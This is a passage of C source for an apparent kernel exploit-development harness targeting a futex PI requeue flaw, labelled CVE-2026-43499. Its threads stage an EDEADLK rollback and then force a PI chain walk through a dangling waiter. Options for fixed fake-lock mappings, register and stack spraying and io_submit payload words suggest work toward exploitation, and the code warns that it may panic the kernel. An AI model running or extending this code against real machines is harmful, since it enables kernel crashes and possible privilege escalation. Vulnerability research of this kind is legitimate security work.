        if (trigger_adjust_pi_syscall_for_tid(tid, nice, attempt) != 0) {
            return -1;
        }
    }
    return 0;
}

static void *watchdog_thread(void *unused)
{
    (void)unused;
    for (long i = 0; i < watchdog_sec * 10; i++) {
        if (__atomic_load_n(&probe_done, __ATOMIC_ACQUIRE)) {
            return NULL;
        }
        usleep(100000);
    }

    printf("[watchdog] probe did not finish within %ld seconds; exiting process\n",
           watchdog_sec);
    fflush(stdout);
    _exit(124);
}

static void *owner_thread(void *unused)
{
    (void)unused;
    long tid = gettid_long();
    long ret;
    int err;

    __atomic_store_n(&futex2, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&owner_ready, 1, __ATOMIC_RELEASE);
    printf("[O] tid=%ld staged futex2 owner word\n", tid);
    fflush(stdout);

    if (wait_flag_eq("waiter_ready", &waiter_ready, 1, 2000) != 0) {
        return NULL;
    }

    __atomic_store_n(&owner_blocking, 1, __ATOMIC_RELEASE);
    printf("[O] entering FUTEX_LOCK_PI(cycle_futex), expected to block\n");
    fflush(stdout);

    ret = xfutex(cycle_futex_ptr(), F_LOCK_PI, 0, NULL, NULL, 0);
    err = errno;
    print_ret("[O] FUTEX_LOCK_PI(cycle_futex)", ret, err);
    __atomic_store_n(&owner_returned, 1, __ATOMIC_RELEASE);

    if (ret == 0) {
        ret = xfutex(cycle_futex_ptr(), F_UNLOCK_PI, 0, NULL, NULL, 0);
        err = errno;
        print_ret("[O] FUTEX_UNLOCK_PI(cycle_futex)", ret, err);
    }
    return NULL;
}

static void *waiter_thread(void *unused)
{
    (void)unused;
    long tid = gettid_long();
    struct timespec timeout;
    long ret;
    int err;

    __atomic_store_n(&waiter_tid_seen, tid, __ATOMIC_RELEASE);

    if (wait_flag_eq("owner_ready", &owner_ready, 1, 2000) != 0) {
        return NULL;
    }

    __atomic_store_n(cycle_futex_ptr(), (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_ready, 1, __ATOMIC_RELEASE);
    printf("[W] tid=%ld staged cycle_futex owner word\n", tid);
    fflush(stdout);

    if (wait_flag_eq("owner_blocking", &owner_blocking, 1, 2000) != 0) {
        return NULL;
    }

    usleep(20000);
    if (clock_gettime(CLOCK_MONOTONIC, &timeout) != 0) {
        perror("[W] clock_gettime");
        return NULL;
    }
    add_ms_to_timespec(&timeout, waiter_timeout_ms);

    __atomic_store_n(&waiter_waiting, 1, __ATOMIC_RELEASE);
    printf("[W] entering FUTEX_WAIT_REQUEUE_PI(futex1 -> futex2)\n");
    fflush(stdout);

    ret = xfutex(&futex1, F_WAIT_REQUEUE_PI, 0, &timeout, &futex2, 0);
    err = errno;
    __atomic_store_n(&waiter_futex_ret_seen, ret, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_futex_errno_seen, err, __ATOMIC_RELEASE);
    if (!waiter_post_return_isolated()) {
        print_ret("[W] FUTEX_WAIT_REQUEUE_PI", ret, err);
    }
    __atomic_store_n(&waiter_returned, 1, __ATOMIC_RELEASE);

    if (waiter_post_return_isolated()) {
        int probe_rc = run_waiter_post_return_probe_once();
        int hold_prepare_rc = waiter_isolated_hold_prepare();
        int probe_failures = (probe_rc == 0 && hold_prepare_rc == 0) ? 0 : 1;

        __atomic_store_n(&waiter_post_return_probe_failures, probe_failures,
                         __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);

        if (__atomic_load_n(&idle_control_mode, __ATOMIC_ACQUIRE) &&
            !adjust_pi_start_isolated_hold) {
            while (!__atomic_load_n(&finish_waiter, __ATOMIC_ACQUIRE)) {
                cpu_relax_user();
            }
            waiter_churn_close_fds();
            return NULL;
        }

        if (__atomic_load_n(&waiter_exit_chainwalk_mode, __ATOMIC_ACQUIRE)) {
            waiter_churn_close_fds();
            return NULL;
        }

        while (!__atomic_load_n(&chainwalk_started, __ATOMIC_ACQUIRE)) {
            cpu_relax_user();
        }

        if (waiter_isolated_hold_mode_is_block_probe()) {
            if (waiter_isolated_hold_mode_is("readv-block-small")) {
                ret = waiter_post_return_readv_block_probe(0);
            } else if (waiter_isolated_hold_mode_is("readv-block-large")) {
                ret = waiter_post_return_readv_block_probe(1);
            } else if (waiter_isolated_hold_mode_is("epoll-block")) {
                ret = waiter_post_return_epoll_block_probe();
            } else if (waiter_isolated_hold_mode_is("sendmsg-block")) {
                ret = waiter_post_return_sendmsg_block_probe(0, 0);
            } else if (waiter_isolated_hold_mode_is("sendmmsg-block")) {
                ret = waiter_post_return_sendmsg_block_probe(1, 0);
            } else if (waiter_isolated_hold_mode_is("sendmmsg-name-block")) {
                ret = waiter_post_return_sendmsg_block_probe(1, 1);
            } else {
                ret = waiter_post_return_sigsuspend_block_probe();
            }
            err = errno;
            print_ret("[W] isolated block-probe hold", ret, err);
        } else {
            __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
        }
        if (waiter_isolated_hold_mode_is("getpidloop")) {
            waiter_getpid_loop(waiter_hold_ms);
        } else if (waiter_isolated_hold_mode_is("getuidloop")) {
            waiter_getuid_loop();
        } else if (waiter_isolated_hold_mode_is("iosubmitloop")) {
            waiter_io_submit_loop();
        } else if (waiter_isolated_hold_mode_is("iosubmitcowloop")) {
            waiter_io_submit_cow_loop();
        } else if (waiter_isolated_hold_mode_is("futexwaittag")) {
            struct timespec hold_timeout = {
                .tv_sec = waiter_hold_ms / 1000,
                .tv_nsec = (waiter_hold_ms % 1000) * 1000000L,
            };

            ret = xfutex(waiter_isolated_hold_futex_tag, F_WAIT, 0,
                         &hold_timeout, NULL, 0);
            err = errno;
            print_ret("[W] isolated FUTEX_WAIT(tag)", ret, err);
        } else if (waiter_isolated_hold_mode_is("seccompgetppid")) {
            waiter_seccomp_getppid_loop(waiter_hold_ms);
        } else if (waiter_isolated_hold_mode_is("seccompgetppidlog")) {
            waiter_seccomp_getppid_log_loop(waiter_hold_ms);
        } else if (waiter_isolated_hold_mode_is("seccompgetppidallowmark")) {
            waiter_seccomp_getppid_allowmark_loop(waiter_hold_ms);
        } else if (waiter_isolated_hold_mode_is("usleep")) {
            usleep((useconds_t)(waiter_hold_ms * 1000));
        } else if (!waiter_isolated_hold_mode_is_block_probe()) {
            busy_relax_for_hold_ms(waiter_hold_ms);
        }

        ret = xfutex(cycle_futex_ptr(), F_UNLOCK_PI, 0, NULL, NULL, 0);
        err = errno;
        print_ret("[W] FUTEX_UNLOCK_PI(cycle_futex)", ret, err);
        waiter_churn_close_fds();
        return NULL;
    }

    run_waiter_churn("post-futex-return");

    if (__atomic_load_n(&idle_control_mode, __ATOMIC_ACQUIRE)) {
        printf("[W] idle-control: returned from futex wait; no chainwalk, no futex cleanup\n");
        fflush(stdout);
        wait_flag_eq("finish_waiter", &finish_waiter, 1,
                     idle_after_edeadlk_ms + 2000);
        waiter_churn_close_fds();
        printf("[W] idle-control: waiter finishing after idle window\n");
        fflush(stdout);
        return NULL;
    }

    if (__atomic_load_n(&waiter_exit_chainwalk_mode, __ATOMIC_ACQUIRE)) {
        waiter_churn_close_fds();
        printf("[W] waiter-exit-control: returned from futex wait; exiting before main chainwalk\n");
        fflush(stdout);
        return NULL;
    }

    printf("[W] returned from futex wait; no stack thrash, waiting for chainwalk start\n");
    fflush(stdout);
    wait_flag_eq("chainwalk_started", &chainwalk_started, 1,
                 ceil_div_long(pre_chainwalk_delay_us, 1000) + 2000);

    printf("[W] holding cycle_futex for %ld ms during chain-walk probe\n",
           waiter_hold_ms);
    fflush(stdout);
    usleep((useconds_t)(waiter_hold_ms * 1000));

    ret = xfutex(cycle_futex_ptr(), F_UNLOCK_PI, 0, NULL, NULL, 0);
    err = errno;
    print_ret("[W] FUTEX_UNLOCK_PI(cycle_futex)", ret, err);
    waiter_churn_close_fds();
    return NULL;
}

static int run_stage_edeadlk_idle(void)
{
    pthread_t owner;
    pthread_t waiter;
    pthread_t watchdog;
    long ret;
    int err;
    int rc;
    int ok = 0;

    __atomic_store_n(&idle_control_mode, 1, __ATOMIC_RELEASE);

    if (watchdog_sec > 0) {
        rc = pthread_create(&watchdog, NULL, watchdog_thread, NULL);
        if (rc == 0) {
            pthread_detach(watchdog);
        }
    }

    rc = pthread_create(&owner, NULL, owner_thread, NULL);
    if (rc != 0) {
        printf("[stage] pthread_create(owner) failed rc=%d (%s)\n",
               rc, strerror(rc));
        return 1;
    }
    pthread_detach(owner);

    rc = pthread_create(&waiter, NULL, waiter_thread, NULL);
    if (rc != 0) {
        printf("[stage] pthread_create(waiter) failed rc=%d (%s)\n",
               rc, strerror(rc));
        return 1;
    }

    if (wait_flag_eq("waiter_waiting", &waiter_waiting, 1, 3000) != 0) {
        printf("[stage] waiter did not enter wait-requeue stage\n");
        return 1;
    }

    usleep(40000);
    printf("[M] firing FUTEX_CMP_REQUEUE_PI(futex1 -> futex2)\n");
    fflush(stdout);

    ret = xfutex(&futex1, F_CMP_REQUEUE_PI,
                 1,
                 (void *)(uintptr_t)1,
                 &futex2,
                 0);
    err = errno;
    print_ret("[M] FUTEX_CMP_REQUEUE_PI", ret, err);

    if (ret == -1 && err == EDEADLK) {
        printf("[stage] observed EDEADLK rollback path\n");
        ok = 1;
    } else {
        printf("[stage] did not observe EDEADLK; keeping this as errno telemetry\n");
    }
    fflush(stdout);

    if (wait_flag_eq("waiter_returned", &waiter_returned, 1,
                     waiter_timeout_ms + 3000) != 0) {
        printf("[stage] waiter did not return; refusing idle-control claim\n");
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    print_ret("[stage] waiter FUTEX_WAIT_REQUEUE_PI",
              __atomic_load_n(&waiter_futex_ret_seen, __ATOMIC_ACQUIRE),
              __atomic_load_n(&waiter_futex_errno_seen, __ATOMIC_ACQUIRE));
    if (wait_post_return_probe_if_needed() != 0) {
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    if (trigger_waiter_adjust_pi_if_requested() != 0) {
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    print_fixed_fake_lock_state("idle_after_waiter_return");

    printf("[stage] idle-control: waiter returned; sleeping %ld ms without main chainwalk\n",
           idle_after_edeadlk_ms);
    fflush(stdout);
    usleep((useconds_t)(idle_after_edeadlk_ms * 1000));
    print_fixed_fake_lock_state("idle_after_sleep");
    printf("[stage] idle-control: no main FUTEX_LOCK_PI(cycle_futex) was issued\n");
    fflush(stdout);

    __atomic_store_n(&finish_waiter, 1, __ATOMIC_RELEASE);
    pthread_join(waiter, NULL);
    __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);

    printf("[stage] idle-control: churn_started=%d churn_done=%d churn_progress=%ld churn_failures=%ld\n",
           __atomic_load_n(&waiter_churn_started, __ATOMIC_ACQUIRE),
           __atomic_load_n(&waiter_churn_done, __ATOMIC_ACQUIRE),
           __atomic_load_n(&waiter_churn_progress, __ATOMIC_ACQUIRE),
           __atomic_load_n(&waiter_churn_failures_seen, __ATOMIC_ACQUIRE));
    printf("[stage] idle-control returned to userspace\n");
    printf("=== cve_2026_43499_chainwalk_probe_idle_done ===\n");
    fflush(stdout);
    return ok ? 0 : 1;
}

static int run_stage_waiter_exit_chainwalk(void)
{
    pthread_t owner;
    pthread_t waiter;
    pthread_t watchdog;
    long ret;
    int err;
    int rc;

    __atomic_store_n(&waiter_exit_chainwalk_mode, 1, __ATOMIC_RELEASE);

    if (watchdog_sec > 0) {
        rc = pthread_create(&watchdog, NULL, watchdog_thread, NULL);
        if (rc == 0) {
            pthread_detach(watchdog);
        }
    }

    rc = pthread_create(&owner, NULL, owner_thread, NULL);
    if (rc != 0) {
        printf("[stage] pthread_create(owner) failed rc=%d (%s)\n",
               rc, strerror(rc));
        return 1;
    }

    rc = pthread_create(&waiter, NULL, waiter_thread, NULL);
    if (rc != 0) {
        printf("[stage] pthread_create(waiter) failed rc=%d (%s)\n",
               rc, strerror(rc));
        return 1;
    }

    if (wait_flag_eq("waiter_waiting", &waiter_waiting, 1, 3000) != 0) {
        printf("[stage] waiter did not enter wait-requeue stage\n");
        return 1;
    }

    usleep(40000);
    printf("[M] firing FUTEX_CMP_REQUEUE_PI(futex1 -> futex2)\n");
    fflush(stdout);

    ret = xfutex(&futex1, F_CMP_REQUEUE_PI,
                 1,
                 (void *)(uintptr_t)1,
                 &futex2,
                 0);
    err = errno;
    print_ret("[M] FUTEX_CMP_REQUEUE_PI", ret, err);

    if (!(ret == -1 && err == EDEADLK)) {
        printf("[stage] did not observe EDEADLK; refusing waiter-exit chainwalk\n");
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }

    printf("[stage] observed EDEADLK rollback path; waiting for waiter return\n");
    fflush(stdout);
    if (wait_flag_eq("waiter_returned", &waiter_returned, 1,
                     waiter_timeout_ms + 3000) != 0) {
        printf("[stage] waiter did not return; refusing waiter-exit chainwalk\n");
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    print_ret("[stage] waiter FUTEX_WAIT_REQUEUE_PI",
              __atomic_load_n(&waiter_futex_ret_seen, __ATOMIC_ACQUIRE),
              __atomic_load_n(&waiter_futex_errno_seen, __ATOMIC_ACQUIRE));
    if (wait_post_return_probe_if_needed() != 0) {
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }

    rc = pthread_join(waiter, NULL);
    if (rc != 0) {
        printf("[stage] pthread_join(waiter) failed rc=%d (%s)\n",
               rc, strerror(rc));
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    printf("[stage] waiter-exit-control: waiter thread joined before main chainwalk\n");
    printf("[stage] waiter-exit-control: owner_returned_before_main=%d\n",
           __atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE));
    fflush(stdout);

    if (post_waiter_exit_delay_ms > 0) {
        printf("[stage] waiter-exit-control: sleeping %ld ms before main chainwalk\n",
               post_waiter_exit_delay_ms);
        fflush(stdout);
        usleep((useconds_t)(post_waiter_exit_delay_ms * 1000));
        printf("[stage] waiter-exit-control: owner_returned_after_delay=%d\n",
               __atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE));
        fflush(stdout);
    }

    /*
     * This is still the explicit dangerous layer. The only intended
     * difference from --stage-chainwalk is that the original waiter thread has
     * exited and been joined before main forces the PI chain walk.
     */
    __atomic_store_n(&chainwalk_started, 1, __ATOMIC_RELEASE);
    if (!quiet_final) {
        print_fixed_fake_lock_state("pre_waiter_exit_chainwalk");
        printf("[M] WAITER-EXIT CHAINWALK PROBE: entering FUTEX_LOCK_PI(cycle_futex)\n");
        fflush(stdout);
    }
    if (main_final_shape_syscall("WAITER-EXIT CHAINWALK PROBE") != 0) {
        printf("[M] WAITER-EXIT CHAINWALK PROBE: main-final-shape failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    ret = main_chainwalk_lock_pi(&err, "WAITER-EXIT CHAINWALK PROBE");
    print_ret("[M] FUTEX_LOCK_PI(cycle_futex)", ret, err);

    if (ret == 0) {
        ret = xfutex(cycle_futex_ptr(), F_UNLOCK_PI, 0, NULL, NULL, 0);
        err = errno;
        print_ret("[M] FUTEX_UNLOCK_PI(cycle_futex)", ret, err);
    }

    if (__atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE)) {
        pthread_join(owner, NULL);
    } else {
        pthread_detach(owner);
    }
    __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);

    printf("[stage] waiter-exit chain-walk probe returned to userspace\n");
    printf("=== cve_2026_43499_chainwalk_probe_waiter_exit_done ===\n");
    fflush(stdout);
    return 0;
}

static int run_stage_chainwalk(void)
{
    pthread_t owner;
    pthread_t waiter;
    pthread_t watchdog;
    long ret;
    int err;
    int rc;

    if (watchdog_sec > 0) {
        rc = pthread_create(&watchdog, NULL, watchdog_thread, NULL);
        if (rc == 0) {
            pthread_detach(watchdog);
        }
    }

    rc = pthread_create(&owner, NULL, owner_thread, NULL);
    if (rc != 0) {
        printf("[stage] pthread_create(owner) failed rc=%d (%s)\n",
               rc, strerror(rc));
        return 1;
    }
    rc = pthread_create(&waiter, NULL, waiter_thread, NULL);
    if (rc != 0) {
        printf("[stage] pthread_create(waiter) failed rc=%d (%s)\n",
               rc, strerror(rc));
        return 1;
    }

    if (wait_flag_eq("waiter_waiting", &waiter_waiting, 1, 3000) != 0) {
        printf("[stage] waiter did not enter wait-requeue stage\n");
        return 1;
    }

    usleep(40000);
    printf("[M] firing FUTEX_CMP_REQUEUE_PI(futex1 -> futex2)\n");
    fflush(stdout);

    ret = xfutex(&futex1, F_CMP_REQUEUE_PI,
                 1,
                 (void *)(uintptr_t)1,
                 &futex2,
                 0);
    err = errno;
    print_ret("[M] FUTEX_CMP_REQUEUE_PI", ret, err);

    if (!(ret == -1 && err == EDEADLK)) {
        printf("[stage] did not observe EDEADLK; refusing chain-walk probe\n");
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }

    printf("[stage] observed EDEADLK rollback path; waiting for waiter return\n");
    fflush(stdout);
    if (wait_flag_eq("waiter_returned", &waiter_returned, 1,
                     waiter_timeout_ms + 3000) != 0) {
        printf("[stage] waiter did not return; refusing chain-walk probe\n");
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    print_ret("[stage] waiter FUTEX_WAIT_REQUEUE_PI",
              __atomic_load_n(&waiter_futex_ret_seen, __ATOMIC_ACQUIRE),
              __atomic_load_n(&waiter_futex_errno_seen, __ATOMIC_ACQUIRE));
    if (wait_post_return_probe_if_needed() != 0) {
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    if (trigger_waiter_adjust_pi_if_requested() != 0) {
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }

    if (pre_chainwalk_delay_us > 0) {
        if ((pre_chainwalk_delay_us % 1000) == 0) {
            printf("[stage] pre-chainwalk-delay: waiter_returned=1 owner_returned_before_delay=%d sleeping %ld ms (%ld us)\n",
                   __atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE),
                   pre_chainwalk_delay_us / 1000,
                   pre_chainwalk_delay_us);
        } else {
            printf("[stage] pre-chainwalk-delay: waiter_returned=1 owner_returned_before_delay=%d sleeping %ld us\n",
                   __atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE),
                   pre_chainwalk_delay_us);
        }
        fflush(stdout);
        usleep((useconds_t)pre_chainwalk_delay_us);
        printf("[stage] pre-chainwalk-delay: owner_returned_after_delay=%d; issuing main chainwalk while waiter should still be live\n",
               __atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE));
        fflush(stdout);
    }

    if (chainwalk_at_churn_iter > 0) {
        printf("[stage] chainwalk-at-churn-iter: waiting for waiter churn progress >= %ld\n",
               chainwalk_at_churn_iter);
        fflush(stdout);
        if (wait_churn_progress_at_least(
                chainwalk_at_churn_iter,
                watchdog_sec > 0 ? watchdog_sec * 1000 : 30000) != 0) {
            printf("[stage] waiter churn progress target not reached; refusing chain-walk probe\n");
            __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
            return 1;
        }
        printf("[stage] chainwalk-at-churn-iter: churn_progress=%ld churn_done=%d churn_failures=%ld owner_returned=%d\n",
               __atomic_load_n(&waiter_churn_progress, __ATOMIC_ACQUIRE),
               __atomic_load_n(&waiter_churn_done, __ATOMIC_ACQUIRE),
               __atomic_load_n(&waiter_churn_failures_seen, __ATOMIC_ACQUIRE),
               __atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE));
        fflush(stdout);
    }

    if (chainwalk_after_churn) {
        printf("[stage] chainwalk-after-churn: waiting for waiter churn completion before main chainwalk\n");
        fflush(stdout);
        if (wait_flag_eq("waiter_churn_done", &waiter_churn_done, 1,
                         watchdog_sec > 0 ? watchdog_sec * 1000 : 30000) != 0) {
            printf("[stage] waiter churn did not complete; refusing chain-walk probe\n");
            __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
            return 1;
        }
        printf("[stage] chainwalk-after-churn: churn_started=%d churn_done=%d churn_progress=%ld churn_failures=%ld owner_returned=%d\n",
               __atomic_load_n(&waiter_churn_started, __ATOMIC_ACQUIRE),
               __atomic_load_n(&waiter_churn_done, __ATOMIC_ACQUIRE),
               __atomic_load_n(&waiter_churn_progress, __ATOMIC_ACQUIRE),
               __atomic_load_n(&waiter_churn_failures_seen, __ATOMIC_ACQUIRE),
               __atomic_load_n(&owner_returned, __ATOMIC_ACQUIRE));
        fflush(stdout);
    }

    /*
     * This is the explicit dangerous layer. If the vulnerable stale
     * pi_blocked_on is present, FUTEX_LOCK_PI(cycle_futex) can make the
     * kernel chain walk through the dangling waiter.
     */
    __atomic_store_n(&chainwalk_started, 1, __ATOMIC_RELEASE);
    if (waiter_post_return_isolated() &&
        !waiter_isolated_hold_mode_is("busy")) {
        if (wait_flag_eq("waiter_active_hold_started",
                         &waiter_active_hold_started, 1, 2000) != 0) {
            printf("[stage] waiter did not enter isolated hold syscall; refusing chain-walk probe\n");
            __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
            return 1;
        }
        printf("[stage] isolated hold mode=%s active_hold_started=%d\n",
               waiter_isolated_hold_mode,
               __atomic_load_n(&waiter_active_hold_started, __ATOMIC_ACQUIRE));
        fflush(stdout);
    }
    if (!quiet_final) {
        print_fixed_fake_lock_state("pre_chainwalk");
        printf("[M] CHAINWALK PROBE: entering FUTEX_LOCK_PI(cycle_futex)\n");
        fflush(stdout);
    }
    if (main_final_shape_syscall("CHAINWALK PROBE") != 0) {
        printf("[M] CHAINWALK PROBE: main-final-shape failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
    ret = main_chainwalk_lock_pi(&err, "CHAINWALK PROBE");
    print_ret("[M] FUTEX_LOCK_PI(cycle_futex)", ret, err);

    if (ret == 0) {
        ret = xfutex(cycle_futex_ptr(), F_UNLOCK_PI, 0, NULL, NULL, 0);
        err = errno;
        print_ret("[M] FUTEX_UNLOCK_PI(cycle_futex)", ret, err);
    }

    pthread_join(waiter, NULL);
    pthread_join(owner, NULL);
    __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);

    printf("[stage] chain-walk probe returned to userspace\n");
    printf("=== cve_2026_43499_chainwalk_probe_done ===\n");
    fflush(stdout);
    return 0;
}

static int parse_long_arg(const char *arg, const char *prefix, long *out)
{
    size_t len = strlen(prefix);
    char *end = NULL;
    long value;

    if (strncmp(arg, prefix, len) != 0) {
        return 0;
    }
    errno = 0;
    value = strtol(arg + len, &end, 10);
    if (errno != 0 || end == arg + len || *end != '\0' || value < 0) {
        fprintf(stderr, "invalid numeric argument: %s\n", arg);
        exit(2);
    }
    *out = value;
    return 1;
}

static int parse_signed_long_arg(const char *arg, const char *prefix, long *out)
{
    size_t len = strlen(prefix);
    char *end = NULL;
    long value;

    if (strncmp(arg, prefix, len) != 0) {
        return 0;
    }
    errno = 0;
    value = strtol(arg + len, &end, 0);
    if (errno != 0 || end == arg + len || *end != '\0') {
        fprintf(stderr, "invalid signed numeric argument: %s\n", arg);
        exit(2);
    }
    *out = value;
    return 1;
}

static int parse_u64_arg(const char *arg, const char *prefix, uint64_t *out)
{
    size_t len = strlen(prefix);
    char *end = NULL;
    unsigned long long value;

    if (strncmp(arg, prefix, len) != 0) {
        return 0;
    }
    errno = 0;
    value = strtoull(arg + len, &end, 0);
    if (errno != 0 || end == arg + len || *end != '\0') {
        fprintf(stderr, "invalid u64 argument: %s\n", arg);
        exit(2);
    }
    *out = (uint64_t)value;
    return 1;
}

static void usage(const char *argv0)
{
    fprintf(stderr,
            "usage:\n"
            "  %s --stage-edeadlk-idle --i-understand-this-may-panic "
            "[--waiter-timeout-ms=N] [--idle-ms=N] "
            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
            "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
            "[--waiter-adjust-pi-after-post-return] [--adjust-pi-start-isolated-hold] "
            "[--map-fixed-fake-lock] [--reuse-fixed-fake-lock-vma] "
            "[--fixed-fake-lock-addr=U64] "
            "[--cycle-futex-mode=global|mmap|fixed] [--cycle-futex-fixed-addr=U64] [--cycle-futex-offset=N] "
            "[--waiter-churn=none|syscall|stack|stackshape|regspray|regsprayclean|fd|mix|memfd|pipe|epoll|unix|slotsearch|slotsearchlast|slotreadlinklast|slotfutexwaithold|slotsendmsghold|frameprobe|pressure] "
            "[--quiet-waiter-churn] "
            "[--stackshape-case=full|readlink|readstatus|unixdgram|nanosleep|gettid|clock|yield|readlink-readstatus|readstatus-unixdgram|readlink-readstatus-unixdgram|unix-nanosleep|nanosleep8|readstatus-nanosleep8|unixdgram-nanosleep8|readstatus-unixdgram-nanosleep8|full-no-readlink|full-no-tail|full-no-nanosleep|tag-readstatus|tag-unixdgram|tag-readstatus-nanosleep8|tag-unixdgram-nanosleep8|tag-readstatus-unixdgram-nanosleep8|stacktag-full|stacktag-readstatus|stacktag-unixdgram|stacktag-readstatus-unixdgram|stacktag-readstatus-nanosleep8|stacktag-unixdgram-nanosleep8|stacktag-readstatus-unixdgram-nanosleep8] "
            "[--frameprobe-case=readlink|clock|nanosleep|futexwake|futexwait|futexwait-args|read|write|readv|writev|ioctl-fionread|sendmsg|recvmsg|sendmsg-block|ppoll|prctl-name] "
            "[--regspray-value=U64] [--stacktag-value=U64] "
            "[--io-submit-word0=U64] [--io-submit-word1=U64] "
            "[--io-submit-task=U64] [--io-submit-lock=U64] "
            "[--io-submit-opcode=N] [--io-submit-reqprio=N] [--io-submit-fd=N] "
            "[--churn-iterations=N] [--churn-keep-fds=N] "
            "[--process-vm-mb=N] "
            "[--churn-progress=each|final|none] "
            "[--stack-marker-telemetry=N] "
            "[--watchdog-sec=N]\n"
            "  %s --stage-waiter-exit-chainwalk --i-understand-this-may-panic "
            "[--waiter-timeout-ms=N] [--post-exit-delay-ms=N] "
            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
            "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
            "[--waiter-adjust-pi-after-post-return] "
            "[--map-fixed-fake-lock] [--reuse-fixed-fake-lock-vma] "
            "[--fixed-fake-lock-addr=U64] "
            "[--cycle-futex-mode=global|mmap|fixed] [--cycle-futex-fixed-addr=U64] [--cycle-futex-offset=N] "
            "[--chainwalk-raw-final] [--chainwalk-raw-timeout-ms=N] [--chainwalk-raw-val3=U64] "
            "[--io-submit-word0=U64] [--io-submit-word1=U64] "
            "[--io-submit-task=U64] [--io-submit-lock=U64] "
            "[--io-submit-opcode=N] [--io-submit-reqprio=N] [--io-submit-fd=N] "
            "[--main-final-shape=none|raw-getpid|raw-futexwake|raw-futexwait-eagain] [--quiet-final] "
            "[--watchdog-sec=N]\n"
            "  %s --stage-chainwalk --i-understand-this-may-panic "
            "[--waiter-timeout-ms=N] [--hold-ms=N] "
            "[--pre-chainwalk-delay-ms=N] [--pre-chainwalk-delay-us=N] "
            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
            "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
            "[--waiter-adjust-pi-after-post-return] "
            "[--map-fixed-fake-lock] [--reuse-fixed-fake-lock-vma] "
            "[--fixed-fake-lock-addr=U64] "
            "[--cycle-futex-mode=global|mmap|fixed] [--cycle-futex-fixed-addr=U64] [--cycle-futex-offset=N] "
            "[--chainwalk-raw-final] [--chainwalk-raw-timeout-ms=N] [--chainwalk-raw-val3=U64] "
            "[--io-submit-word0=U64] [--io-submit-word1=U64] "
            "[--io-submit-task=U64] [--io-submit-lock=U64] "
            "[--io-submit-opcode=N] [--io-submit-reqprio=N] [--io-submit-fd=N] "
            "[--main-final-shape=none|raw-getpid|raw-futexwake|raw-futexwait-eagain] [--quiet-final] "
